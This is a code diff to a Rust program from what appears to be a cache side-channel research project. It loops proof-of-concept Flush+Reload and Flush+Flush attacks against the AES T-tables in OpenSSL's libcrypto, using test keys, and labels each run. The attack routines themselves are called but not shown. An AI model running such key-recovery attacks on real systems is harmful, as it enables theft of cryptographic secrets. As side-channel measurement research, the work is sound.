@@ -25,53 +25,62 @@ fn main() {
     let openssl_path = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");
     let mut side_channel = NaiveFlushAndReload::from_threshold(220);
     let te = TE_CITRON_VERT;
-    unsafe {
-        attack_t_tables_poc(
-            &mut side_channel,
-            AESTTableParams {
-                num_encryptions: 1 << 12,
-                key: [0; 32],
-                te: te, // adjust me (should be in decreasing order)
-                openssl_path: &openssl_path,
-            },
-        )
-    }; /**/
-    unsafe {
-        attack_t_tables_poc(
-            &mut side_channel,
-            AESTTableParams {
-                num_encryptions: 1 << 12,
-                key: KEY2,
-                te: te,
-                openssl_path: &openssl_path,
-            },
-        )
-    };
-    let (mut side_channel_ff, old, core) = FlushAndFlush::new_any_single_core().unwrap();
-    unsafe {
-        attack_t_tables_poc(
-            &mut side_channel_ff,
-            AESTTableParams {
-                num_encryptions: 1 << 12,
-                key: [0; 32],
-                te: te, // adjust me (should be in decreasing order)
-                openssl_path: &openssl_path,
-            },
-        )
-    };
+    for i in 0..4 {
+        println!("AES attack with Naive F+R, key 0");
+        unsafe {
+            attack_t_tables_poc(
+                &mut side_channel,
+                AESTTableParams {
+                    num_encryptions: 1 << 12,
+                    key: [0; 32],
+                    te: te, // adjust me (should be in decreasing order)
+                    openssl_path: &openssl_path,
+                },
+            )
+        };
+        println!("AES attack with Naive F+R, key 1");
+        unsafe {
+            attack_t_tables_poc(
+                &mut side_channel,
+                AESTTableParams {
+                    num_encryptions: 1 << 12,
+                    key: KEY2,
+                    te: te,
+                    openssl_path: &openssl_path,
+                },
+            )
+        };
+        println!("AES attack with Multiple F+F (limit = 3), key 0");
+        {
+            let (mut side_channel_ff, old, core) = FlushAndFlush::new_any_single_core().unwrap();
+            unsafe {
+                attack_t_tables_poc(
+                    &mut side_channel_ff,
+                    AESTTableParams {
+                        num_encryptions: 1 << 12,
+                        key: [0; 32],
+                        te: te, // adjust me (should be in decreasing order)
+                        openssl_path: &openssl_path,
+                    },
+                )
+            };
+        }
 
-    sched_setaffinity(Pid::from_raw(0), &old);
-    let (mut side_channel_ff, old, core) = SingleFlushAndFlush::new_any_single_core().unwrap();
-    unsafe {
-        attack_t_tables_poc(
-            &mut side_channel_ff,
-            AESTTableParams {
-                num_encryptions: 1 << 12,
-                key: KEY2,
-                te: te, // adjust me (should be in decreasing order)
-                openssl_path: &openssl_path,
-            },
-        )
-    };
-    sched_setaffinity(Pid::from_raw(0), &old);
+        println!("AES attack with Single F+F , key 1");
+        {
+            let (mut side_channel_ff, old, core) =
+                SingleFlushAndFlush::new_any_single_core().unwrap();
+            unsafe {
+                attack_t_tables_poc(
+                    &mut side_channel_ff,
+                    AESTTableParams {
+                        num_encryptions: 1 << 12,
+                        key: KEY2,
+                        te: te, // adjust me (should be in decreasing order)
+                        openssl_path: &openssl_path,
+                    },
+                )
+            }
+        }
+    }
 }
